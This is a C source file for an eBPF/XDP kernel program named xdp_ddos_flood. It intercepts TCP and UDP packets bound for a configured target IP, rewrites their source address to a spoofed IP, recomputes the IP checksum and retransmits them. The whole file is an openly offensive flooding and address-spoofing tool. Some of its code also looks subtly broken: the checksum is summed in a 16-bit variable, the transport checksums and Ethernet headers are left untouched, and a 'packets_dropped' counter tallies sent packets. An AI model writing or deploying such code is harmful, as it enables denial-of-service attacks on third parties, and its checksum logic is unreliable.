#include "../include/xdp_kern.h"

struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, struct xdp_config_t);
} xdp_cfg_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, struct xdp_stats_t);
} xdp_stats_map SEC(".maps");

static __always_inline struct xdp_config_t *get_config(void) {
    __u32 key = 0;
    return bpf_map_lookup_elem(&xdp_cfg_map, &key);
}

static __always_inline struct xdp_stats_t *get_stats(void) {
    __u32 key = 0;
    return bpf_map_lookup_elem(&xdp_stats_map, &key);
}

SEC("xdp")
int xdp_ddos_flood(struct xdp_md *ctx) {
    void *data_end = (void *)(long)ctx->data_end;
    void *data = (void *)(long)ctx->data;
    struct xdp_config_t *cfg = get_config();
    if (!cfg) return XDP_PASS;

    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end) return XDP_PASS;

    if (bpf_htons(eth->h_proto) != ETH_P_IP) return XDP_PASS;

    struct iphdr *ip = (struct iphdr *)(eth + 1);
    if ((void *)(ip + 1) > data_end) return XDP_PASS;

    if (ip->protocol != IPPROTO_TCP && ip->protocol != IPPROTO_UDP) return XDP_PASS;

    __u32 dst_ip = bpf_ntohl(ip->daddr);
    if (dst_ip != cfg->target_ip) return XDP_PASS;

    struct xdp_stats_t *stats = get_stats();
    if (stats) {
        __sync_fetch_and_add(&stats->packets_dropped, 1);
        __sync_fetch_and_add(&stats->bytes_sent, bpf_ntohs(ip->tot_len));
    }

    ip->saddr = cfg->spoof_base_ip;
    ip->check = 0;
    __u16 csum = 0;
    __u16 *buf = (__u16 *)ip;
    #pragma unroll
    for (int i = 0; i < sizeof(struct iphdr) / 2; i++) {
        csum += bpf_ntohs(buf[i]);
    }
    csum = (csum & 0xFFFF) + (csum >> 16);
    csum = (csum & 0xFFFF) + (csum >> 16);
    ip->check = bpf_htons(~csum);

    cfg->packet_count++;

    return XDP_TX;
}

SEC("license") const char __license[] = "GPL";
